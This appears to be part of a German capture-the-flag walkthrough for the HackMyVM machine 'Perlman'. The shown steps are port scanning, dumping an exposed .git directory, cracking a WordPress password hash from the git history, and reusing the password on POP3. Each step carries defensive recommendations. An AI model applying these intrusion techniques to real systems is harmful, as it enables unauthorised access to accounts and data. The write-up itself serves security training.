@@ -1,0 +1,1076 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Perlman - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad ggf. anpassen -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ <div class="nav-wrapper">
+    <div class="hamburger-nav-wrapper">
+        <input type="checkbox" id="hamburger-toggle">
+        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </label>
+
+        <nav class="navbar" id="main-nav">
+            <a href="../../aboutme.html">Über mich</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../index.html">HackMyVM</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnyx.html">Vulnyx</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnhub.html">Vulnhub</a> <!-- Pfad ggf. anpassen -->
+        </nav>
+  </div></div>
+    <div class="header-bg">
+        <!-- Titel und Schwierigkeitsgrad angepasst -->
+        <h1>Perlman - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <!-- Klasse für Hard gesetzt -->
+            <h2 class="level-hard">Hard</h2>
+            <div class="circle">
+                <!-- Farben werden durch CSS für .level-hard gesteuert -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Liste der verwendeten Tools basierend auf dem Text -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">gitdumper.sh</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">hashcat</div>
+                <div class="tool-item">wpscan</div>
+                <div class="tool-item">searchsploit</div>
+                <div class="tool-item">python</div>
+                <div class="tool-item">msfconsole</div>
+                <div class="tool-item">meterpreter</div>
+                <div class="tool-item">shell (metasploit)</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">watch</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">pwd</div>
+                <div class="tool-item">touch</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                 <!-- Inhaltsverzeichnis angepasst -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#service-enumeration">Service Enumeration</a>
+                    <ul>
+                        <li><a href="#enum-http80">Port 80 (Apache)</a></li>
+                        <li><a href="#enum-nntp">Port 119 (NNTP)</a></li>
+                        <li><a href="#enum-git">Git Repository Dump</a></li>
+                        <li><a href="#enum-hashcrack">Hash Cracking (webmaster)</a></li>
+                        <li><a href="#enum-mail">Mail Services (SMTP/POP3 - rita)</a></li>
+                        <li><a href="#enum-wordpress">WordPress Enumeration (itzhak.perlman.hmv)</a></li>
+                    </ul>
+                </li>
+                <li><a href="#initial-access">Initial Access (POC - WordPress Exploit)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a>
+                    <ul>
+                        <li><a href="#privesc-rita">Lateral Movement zu rita (POP3 Credentials)</a></li>
+                        <li><a href="#privesc-milou">Lateral Movement zu milou (Cronjob Exploit & SSH Key)</a></li>
+                        <li><a href="#privesc-zeperlman">Lateral Movement zu ze_perlman (CSV Command Injection & SSH Key)</a></li>
+                        <li><a href="#privesc-root">POC: Eskalation zu root (sudo Script & chown Exploit)</a></li>
+                     </ul>
+                </li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                     <pre>
+<span class="command">192.168.2.122	08:00:27:5c:02:b8	PCS Systemtechnik GmbH</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** `arp-scan -l` wird eingesetzt, um aktive Hosts im lokalen Netzwerk zu entdecken. Ein Gerät mit der IP `192.168.2.122` wird gefunden. Die MAC-Adresse `08:00:27:5c:02:b8` gehört zum OUI von "PCS Systemtechnik GmbH", was typisch für eine VirtualBox-VM ist.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Zielsystem wurde erfolgreich identifiziert. Die IP `192.168.2.122` wird für weitere Scans genutzt.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nmap-Scan auf die IP `192.168.2.122` durchführen.<br>
+                **Empfehlung (Admin):** Sicherstellen, dass nur autorisierte Geräte im Netzwerk aktiv sind, z.B. durch Netzwerk-Monitoring oder MAC-Adressen-Filterung (obwohl letzteres umgangen werden kann).
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre>
+<span class="comment"># Eintrag hinzugefügt:</span>
+<span class="command">192.168.2.122    perlman.hmv</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Der Hostname `perlman.hmv` wird manuell der lokalen `/etc/hosts`-Datei des Angreifers hinzugefügt und auf die IP-Adresse des Zielsystems `192.168.2.122` gemappt.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dies ermöglicht es dem Angreifer, das Zielsystem über den Hostnamen `perlman.hmv` anzusprechen, was für Webanwendungen, die virtuelle Hosts verwenden, oder für eine bessere Übersichtlichkeit nützlich ist.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Hostnamen verwenden, wenn sie in Konfigurationen oder Fehlermeldungen auftauchen, um potenzielle virtuelle Hosts korrekt anzusprechen.<br>
+                **Empfehlung (Admin):** Interne DNS-Auflösung sicher gestalten. Die Notwendigkeit spezifischer Hostnamen für Dienste prüfen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.122 -p-</span></div>
+                    <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-06 22:38 CEST
+Nmap scan report for perlman.hmv (<span class="command">192.168.2.122</span>)
+Host is up (0.00013s latency).
+Not shown: 65529 closed tcp ports (reset)
+PORT    STATE SERVICE  VERSION
+<span class="command">22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+| ssh-hostkey: [...]
+<span class="command">25/tcp  open  smtp     Postfix smtpd</span>
+|_smtp-commands: perlman.hmv, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+| ssl-cert: Subject: commonName=perlman[...]
+|_ssl-date: TLS randomness does not represent time
+<span class="command">80/tcp  open  http     Apache httpd 2.4.54 ((Debian))</span>
+|_http-title: Sync - Mobile App Landing Page HTML Template
+<span class="password">| http-git:</span>
+<span class="password">|   192.168.2.122:80/.git/</span>
+<span class="password">|     Git repository found!</span>
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|_    Last commit message: wp
+|_http-server-header: Apache/2.4.54 (Debian)
+<span class="command">110/tcp open  pop3     Dovecot pop3d</span>
+|_pop3-capabilities: [...] SASL(PLAIN) [...]
+| ssl-cert: Subject: commonName=perlman[...]
+|_ssl-date: TLS randomness does not represent time
+<span class="command">119/tcp open  nntp     InterNetNews (INN) 2.6.4</span>
+<span class="command">995/tcp open  ssl/pop3 Dovecot pop3d</span>
+|_pop3-capabilities: SASL(PLAIN) [...]
+| ssl-cert: Subject: commonName=perlman[...]
+|_ssl-date: TLS randomness does not represent time
+MAC Address: 08:00:27:5C:02:B8 (Oracle VirtualBox virtual NIC)
+[...]
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Ein Nmap-Scan identifiziert mehrere offene Ports auf `perlman.hmv`:
+                *   **Port 22 (SSH):** OpenSSH 8.4p1 (Debian 11). Standard-Login.
+                *   **Port 25 (SMTP):** Postfix. Ermöglicht E-Mail-Versand und -Empfang. Unterstützt STARTTLS.
+                *   **Port 80 (HTTP):** Apache 2.4.54 (Debian). Zeigt eine Webseite mit dem Titel "Sync - Mobile App Landing Page HTML Template". **Kritisch:** Das Nmap-Skript `http-git` findet ein offenes `.git`-Verzeichnis im Webroot.
+                *   **Port 110 (POP3):** Dovecot. Zum Abrufen von E-Mails. Unterstützt Klartext-Authentifizierung (SASL PLAIN).
+                *   **Port 119 (NNTP):** InterNetNews (INN) 2.6.4. Ein Newsgroup-Server.
+                *   **Port 995 (POP3S):** Dovecot über SSL/TLS.
+                Alle Dienste scheinen auf Debian zu laufen. Die SSL-Zertifikate sind selbstsigniert für `perlman`.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Die Angriffsfläche ist relativ groß:
+                *   **HTTP/.git (Port 80):** Das offene `.git`-Verzeichnis ist die höchste Priorität. Es erlaubt das Herunterladen des gesamten Quellcodes und der Git-Historie, was oft zu Credentials, Konfigurationsdateien oder Schwachstellen im Code führt.
+                *   **Mail (Ports 25, 110, 995):** Potenzielle Quelle für Benutzernamen (Enumeration via SMTP VRFY/EXPN, falls erlaubt) und Login-Möglichkeit (POP3), wenn Credentials gefunden werden. Die Unterstützung von SASL PLAIN über unverschlüsseltes POP3 (Port 110) ist unsicher.
+                *   **NNTP (Port 119):** Weniger häufiger Vektor, aber könnte zur Informationsgewinnung (Benutzernamen, Nachrichten) genutzt werden.
+                *   **SSH (Port 22):** Benötigt Credentials.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):**
+                1.  **Git Dump (Port 80):** Sofort das `.git`-Verzeichnis mit einem Tool wie `git-dumper` herunterladen und die Historie analysieren (`git log`, `git diff`).
+                2.  **NNTP (Port 119):** Mit `nc` verbinden und die verfügbaren Gruppen und Artikel untersuchen.
+                3.  **Mail (Ports 110/995):** Nach Benutzernamen suchen (z.B. aus NNTP, Git) und versuchen, sich mit gefundenen Passwörtern anzumelden.
+                4.  **HTTP (Port 80):** Nach der Git-Analyse ggf. mit `gobuster` weiter nach versteckten Inhalten suchen.<br>
+                **Empfehlung (Admin):**
+                1.  **Git:** Das `.git`-Verzeichnis **niemals** im Webroot belassen. `.git`-Verzeichnisse über Webserver-Konfiguration (z.B. Apache `.htaccess` oder Nginx `location`) blockieren.
+                2.  **Mail:** POP3 über Port 110 (unverschlüsselt) deaktivieren oder STARTTLS erzwingen. Nur POP3S (Port 995) anbieten. Benutzerenumeration via SMTP VRFY/EXPN deaktivieren. Postfix und Dovecot aktuell halten und sicher konfigurieren.
+                3.  **NNTP:** Den Dienst deaktivieren, wenn er nicht benötigt wird. Zugriff beschränken.
+                4.  **Apache/SSH:** Standard-Härtung.
+            </p>
+        </section>
+
+        <section id="service-enumeration">
+            <h2>Service Enumeration</h2>
+
+            <h3 id="enum-http80">Port 80 (Apache)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.122"  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100 -e -s "200,204,301,302,307,401"</span></div>
+                     <pre>
+[...]
+===============================================================
+/<span class="command">index.html</span>           (Status: 200) [Size: 47426]
+/<span class="command">css</span>                  (Status: 301) [Size: 312] [--> http://192.168.2.122/css/]
+/<span class="command">images</span>               (Status: 301) [Size: 315] [--> http://192.168.2.122/images/]
+/<span class="command">privacy-policy.html</span>  (Status: 200) [Size: 25624]
+/<span class="command">js</span>                   (Status: 301) [Size: 311] [--> http://192.168.2.122/js/]
+/<span class="command">terms-conditions.html</span> (Status: 200) [Size: 18494]
+===============================================================
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                 **Analyse:** `gobuster` wird auf Port 80 ausgeführt. Es findet Standard-Webverzeichnisse (`css`, `images`, `js`) und einige HTML-Dateien (`index.html`, `privacy-policy.html`, `terms-conditions.html`). Keine unmittelbar verdächtigen Dateien oder Skripte werden gefunden.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Bestätigt die Struktur einer Standard-Webseite. Der wichtigste Fund auf Port 80 bleibt das `.git`-Verzeichnis aus dem Nmap-Scan.
+            </p>
+
+             <h3 id="enum-nntp">Port 119 (NNTP)</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -v perlman.hmv 119</span></div>
+                     <pre>
+perlman.hmv [192.168.2.122] 119 (nntp) open
+200 server.example.net InterNetNews NNRP server INN 2.6.4 ready (posting ok)
+<span class="command">help</span>
+100 Legal commands
+[...]
+<span class="command">list</span>
+215 Newsgroups in form "group high low status"
+[...]
+<span class="command">local.general</span> 0000000000 0000000001 y
+<span class="command">local.test</span> 0000000000 0000000001 y
+<span class="command">perlman.hmv</span> 0000000002 0000000001 y
+.
+<span class="command">group perlman.hmv</span>
+211 1 1 2 perlman.hmv
+<span class="command">ARTICLE 2</span>
+220 2 <tfi784$403$1@perlman.hmv> article
+Path: server.example.net!.POSTED.192.168.0.27!not-for-mail
+From: <span class="password">rita <rita@perlman.hmv></span>
+Newsgroups: perlman.hmv
+Subject: Whats up ?!
+Date: Sat, 10 Sep 2022 14:33:40 -0000 (UTC)
+[...]
+User-Agent: Pan/0.151 (Butcha; a6f6327)
+Xref: server.example.net perlman.hmv:2
+
+So cool to have installed a newsgroup server!
+See you soon kissss
+.
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Eine manuelle Verbindung mit `nc` zum NNTP-Server auf Port 119 wird hergestellt. Die Befehle `help`, `list`, `group perlman.hmv` und `ARTICLE 2` werden verwendet, um die verfügbaren Gruppen und Artikel zu untersuchen. Artikel 2 in der Gruppe `perlman.hmv` stammt von `rita <rita@perlman.hmv>`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Ein Benutzername, `rita`, wurde durch die NNTP-Enumeration identifiziert. Dies ist wertvoll für spätere Login-Versuche bei POP3 oder SSH.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Den Benutzernamen `rita` notieren und für Angriffe auf POP3/SSH verwenden.<br>
+                **Empfehlung (Admin):** Den NNTP-Dienst deaktivieren, wenn er nicht benötigt wird. Den Zugriff beschränken und sicherstellen, dass keine sensiblen Informationen oder Benutzernamen preisgegeben werden.
+            </p>
+
+             <h3 id="enum-git">Git Repository Dump</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -v http://perlman.hmv/.git</span></div>
+                     <pre>
+*   Trying 192.168.2.122:80...
+* Connected to perlman.hmv (192.168.2.122) port 80 (#0)
+> GET /.git HTTP/1.1
+[...]
+< HTTP/1.1 <span class="command">301 Moved Permanently</span>
+<span class="comment"><!-- Redirect auf http://perlman.hmv/.git/ --></span>
+[...]
+<title>301 Moved Permanently</title>
+[...]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** `curl` bestätigt, dass `http://perlman.hmv/.git` existiert und auf `http://perlman.hmv/.git/` weiterleitet.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Das `.git`-Verzeichnis ist definitiv zugänglich.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/git-dumper]
+└─# <span class="command">./gitdumper.sh http://perlman.hmv/.git/ .</span></div>
+                     <pre>
+[...]
+[+] Downloaded: HEAD
+[-] Downloaded: objects/info/packs <span class="comment"># Fehler beim Download von Packfiles sind möglich</span>
+[+] Downloaded: description
+[+] Downloaded: config
+[+] Downloaded: COMMIT_EDITMSG
+[+] Downloaded: index
+[+] Downloaded: packed-refs
+[+] Downloaded: refs/heads/master
+[...]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Das Tool `gitdumper.sh` wird verwendet, um den Inhalt des `.git`-Verzeichnisses vom Webserver herunterzuladen. Es lädt erfolgreich viele der Git-internen Dateien und Verzeichnisstrukturen herunter.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Das Git-Repository wurde erfolgreich lokal geklont. Die Historie und der Quellcode können nun offline analysiert werden.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/git-dumper/http:/perlman.hmv]
+└─# <span class="command">git status</span></div>
+                     <pre>
+Auf Branch master
+Änderungen, die nicht zum Commit vorgemerkt sind:
+  (benutzen Sie "git add/rm <Datei>...", um die Änderungen zum Commit vorzumerken)
+  (benutzen Sie "git restore <Datei>...", um die Änderungen im Arbeitsverzeichnis zu verwerfen)
+	gelöscht:       ../../commentmeta.sql
+	gelöscht:       ../../comments.sql
+    <span class="comment"># Viele weitere gelöschte .sql Dateien</span>
+	gelöscht:       ../../users.sql
+
+Unversionierte Dateien:
+  (benutzen Sie "git add <Datei>...", um die Änderungen zum Commit vorzumerken)
+	../../.gitignore
+    <span class="comment"># Viele Dateien des git-dumper Tools selbst</span>
+	../../setup.cfg
+
+keine Änderungen zum Commit vorgemerkt (benutzen Sie "git add" und/oder "git commit -a")
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** `git status` im heruntergeladenen Verzeichnis zeigt viele Dateien als "gelöscht" an. Dies sind wahrscheinlich die eigentlichen Quellcodedateien oder SQL-Dumps, die im letzten Commit vorhanden waren, aber nicht direkt vom `gitdumper`-Tool wiederhergestellt wurden. Es zeigt auch viele untracked files, die zum `gitdumper`-Tool gehören.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Der aktuelle Checkout ist unvollständig. Die Dateien müssen aus der Git-Historie wiederhergestellt werden.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/git-dumper/http:/perlman.hmv]
+└─# <span class="command">git reset --hard</span></div>
+                     <pre>
+HEAD ist jetzt bei <span class="command">40f3ff4 wp</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                 **Analyse:** `git reset --hard` setzt das lokale Arbeitsverzeichnis auf den Stand des letzten Commits (`HEAD`, Commit `40f3ff4` mit der Nachricht "wp") zurück. Dies stellt die "gelöschten" Dateien wieder her.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Das lokale Repository entspricht nun dem letzten Stand auf dem Server. Die SQL-Dateien sind jetzt verfügbar.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/git-dumper]
+└─# <span class="command">ls -la</span></div>
+                      <pre>
+[...]
+-rw-r--r--  1 root root    2144 Oct  6 23:02 commentmeta.sql
+-rw-r--r--  1 root root    3538 Oct  6 23:02 comments.sql
+[...]
+-rw-r--r--  1 root root    2763 Oct  6 23:02 <span class="command">users.sql</span>
+[...]
+                     </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/git-dumper]
+└─# <span class="command">cat users.sql</span></div>
+                     <pre>
+[...]
+INSERT INTO `users` VALUES (1,'<span class="command">webmaster</span>','','webmaster','<span class="command">webmaster@perlman.hmv</span>','http://perlman.hmv','2022-07-03 16:23:02','',0,'webmaster');
+[...]
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Das Listing zeigt die wiederhergestellten SQL-Dateien. Der Inhalt von `users.sql` wird angezeigt. Er enthält einen `INSERT`-Befehl für einen Benutzer `webmaster` mit der E-Mail `webmaster@perlman.hmv`. Das Passwortfeld ist leer ('').
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Ein weiterer Benutzername (`webmaster`) wurde gefunden. Im aktuellen Commit ist kein Passwort-Hash gespeichert. Die Git-Historie muss untersucht werden.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/git-dumper]
+└─# <span class="command">git log --oneline</span></div>
+                     <pre>
+<span class="command">40f3ff4</span> (HEAD -> master) wp
+<span class="command">0cf1c46</span> config
+<span class="command">d29e544</span> perlman
+                    </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/git-dumper]
+└─# <span class="command">git diff 0cf1c46 d29e544</span></div>
+                      <pre>
+diff --git a/users.sql b/users.sql
+index 7fe7dd3..572f66c 100644
+--- a/users.sql
++++ b/users.sql
+@@ -46,7 +46,7 @@ CREATE TABLE `users` (
+
+ LOCK TABLES `users` WRITE;
+ /*!40000 ALTER TABLE `users` DISABLE KEYS */;
+-<span style="color:red">-INSERT INTO `users` VALUES (1,'webmaster','','webmaster','webmaster@perlman.hmv','http://perlman.hmv','2022-07-03 16:23:02','',0,'webmaster');</span>
++<span style="color:lime">+INSERT INTO `users` VALUES (1,'webmaster','<span class="password">$P$BCaMhRZQp/mi0nyIVVPS6u1EU8sTCR/</span>','webmaster','webmaster@perlman.hmv','http://perlman.hmv','2022-07-03 16:23:02','',0,'webmaster');</span>
+ /*!40000 ALTER TABLE `users` ENABLE KEYS */;
+ UNLOCK TABLES;
+ /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** `git log` zeigt die letzten drei Commits. `git diff` vergleicht den Commit `0cf1c46` (config) mit dem vorherigen Commit `d29e544` (perlman). Der Vergleich zeigt, dass in der Datei `users.sql` im älteren Commit (`d29e544`, grün/+) ein Passwort-Hash (`$P$BCaMhRZQp/mi0nyIVVPS6u1EU8sTCR/`) für den `webmaster`-Benutzer vorhanden war, der im neueren Commit (`0cf1c46`, rot/-) entfernt (durch '') ersetzt wurde.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Kritischer Fund! Ein Passwort-Hash für `webmaster` wurde in der Git-Historie gefunden. Der Hash-Typ (`$P$`) deutet auf phpass hin, der oft von WordPress verwendet wird. Dieser Hash kann nun versucht werden zu knacken.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Den gefundenen Hash (`$P$BCaMhRZQp/mi0nyIVVPS6u1EU8sTCR/`) mit `hashcat` oder `john` und einer Wortliste knacken.<br>
+                **Empfehlung (Admin):** Niemals sensible Daten wie Passwort-Hashes in Git-Repositories committen. Die Git-Historie bereinigen (ist aber komplex und oft nicht vollständig möglich). Sicherstellen, dass keine `.git`-Verzeichnisse öffentlich zugänglich sind. Passwörter für betroffene Konten sofort ändern.
+            </p>
+
+            <h3 id="enum-hashcrack">Hash Cracking (webmaster)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/perlman]
+└─# <span class="command">echo "\$P\$BCaMhRZQp/mi0nyIVVPS6u1EU8sTCR/" > hash</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~/perlman]
+└─# <span class="command">cat hash</span></div>
+                     <pre>$P$BCaMhRZQp/mi0nyIVVPS6u1EU8sTCR/</pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~/perlman]
+└─# <span class="command">hashcat hash -a 0 /usr/share/wordlists/rockyou.txt</span></div>
+                      <pre>
+hashcat (v6.2.5) starting in autodetect mode
+[...]
+<span class="password">$P$BCaMhRZQp/mi0nyIVVPS6u1EU8sTCR/:cookie</span>
+
+Session..........: hashcat
+Status...........: <span class="password">Cracked</span>
+Hash.Mode........: 400 (phpass)
+Hash.Target......: $P$BCaMhRZQp/mi0nyIVVPS6u1EU8sTCR/
+[...]
+Recovered........: 1/1 (100.00%) Digests
+[...]
+                     </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~/perlman]
+└─# <span class="command">hashcat hash -a 0 /usr/share/wordlists/rockyou.txt --show</span></div>
+                      <pre>
+[...]
+<span class="password">$P$BCaMhRZQp/mi0nyIVVPS6u1EU8sTCR/:cookie</span>
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Der aus Git extrahierte phpass-Hash wird in die Datei `hash` geschrieben. `hashcat` wird im Dictionary-Angriffsmodus (`-a 0`) mit der `rockyou.txt`-Wortliste darauf angesetzt. `hashcat` identifiziert den Hash-Typ korrekt als Modus 400 (phpass) und knackt ihn erfolgreich. Das Passwort lautet `cookie`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Passwort für den Benutzer `webmaster` wurde ermittelt. Dies könnte für den WordPress-Login (falls vorhanden und `webmaster` dort ein Konto hat) oder potenziell für andere Dienste (POP3, SSH) relevant sein.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Das Passwort `cookie` für den Benutzer `webmaster` bei allen relevanten Diensten testen (WordPress, POP3, SSH). Da ein WordPress-Login wahrscheinlich ist (Commit-Nachricht "wp"), dies zuerst prüfen.<br>
+                **Empfehlung (Admin):** Das Passwort für `webmaster` sofort ändern. Starke Passwörter verwenden.
+            </p>
+
+             <h3 id="enum-mail">Mail Services (SMTP/POP3 - rita)</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/perlman]
+└─# <span class="command">nc -v 192.168.2.122 25</span></div>
+                    <pre>
+[...]
+<span class="command">vrfy rita</span>
+<span class="password">252 2.0.0 rita</span> <span class="comment"># Benutzer existiert</span>
+[...]
+                     </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/perlman]
+└─# <span class="command">nc -v 192.168.2.122 110</span></div>
+                     <pre>
+perlman.hmv [192.168.2.122] 110 (pop3) open
++OK Dovecot (Debian) ready.
+<span class="command">user rita</span>
++OK
+<span class="command">pass cookie</span>
+<span class="password">+OK Logged in.</span>
+<span class="command">list</span>
++OK 1 messages:
+1 2648
+.
+<span class="command">retr 1</span>
++OK 2648 octets
+<span class="comment"># --- Email Inhalt ---</span>
+Return-Path: <>
+X-Original-To: rita@perlman.hmv
+Delivered-To: rita@perlman.hmv
+[...]
+From: MAILER-DAEMON@perlman.hmv (Mail Delivery System)
+Subject: Undelivered Mail Returned to Sender
+To: rita@perlman.hmv
+[...]
+   This is the mail system at host perlman.hmv.
+[...]
+<span class="password"><bentec_hacker@hacker.de>: host mxext1.mailbox.org[...] said: 550 5.1.8 <rita@perlman.hmv>: Sender address rejected: Domain not found</span>
+[...]
+Reporting-MTA: dns; perlman.hmv
+[...]
+Final-Recipient: rfc822; bentec_hacker@hacker.de
+Original-Recipient: rfc822;bentec_hacker@hacker.de
+[...]
+
+<span class="comment"># --- Ende Email Inhalt ---</span>
+.
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                **Analyse:** Zuerst wird über SMTP (Port 25) der Benutzer `rita` (aus NNTP bekannt) mit `vrfy` bestätigt. Anschließend wird über POP3 (Port 110) versucht, sich als `rita` mit dem für `webmaster` geknackten Passwort `cookie` anzumelden. Der Login ist erfolgreich! Eine E-Mail wird abgerufen. Es handelt sich um eine Unzustellbarkeitsnachricht (Bounce) für eine E-Mail, die `rita` an `bentec_hacker@hacker.de` senden wollte. Der Bounce-Grund ist "Domain not found". Wichtig ist die Zeile `From: MAILER-DAEMON (mailer@itzhak.perlman.hmv)`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Passwort `cookie` wurde wiederverwendet und gehört auch zum Benutzer `rita`. Dies ermöglicht den Zugriff auf `rita`s E-Mails. Die Bounce-Nachricht enthüllt einen weiteren internen Hostnamen oder eine Subdomain: `itzhak.perlman.hmv`. Dies ist ein sehr wichtiger Fund, da auf der Hauptdomain `perlman.hmv` (bis auf das `.git`-Repo) nicht viel zu finden war.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):**
+                1.  Den Hostnamen `itzhak.perlman.hmv` zur lokalen `/etc/hosts`-Datei hinzufügen (auf `192.168.2.122` zeigend).
+                2.  Die Webseite `http://itzhak.perlman.hmv` untersuchen (wahrscheinlich WordPress, basierend auf Git-Commits und `/wp-admin/` im späteren Exploit).
+                3.  Weitere E-Mails von `rita` abrufen, falls vorhanden.<br>
+                **Empfehlung (Admin):** Passwort-Wiederverwendung unterbinden. Benutzer schulen, starke, einzigartige Passwörter zu verwenden. POP3 über Port 110 deaktivieren/absichern. Interne Hostnamen sollten nicht in Bounce-Nachrichten nach außen dringen.
+            </p>
+
+            <h3 id="enum-wordpress">WordPress Enumeration (itzhak.perlman.hmv)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/perlman]
+└─# <span class="command">cat /etc/hosts</span></div>
+                      <pre>
+[...]
+<span class="command">192.168.2.122    perlman.hmv itzhak.perlman.hmv</span> <span class="comment"># Zweiter Hostname hinzugefügt</span>
+                     </pre>
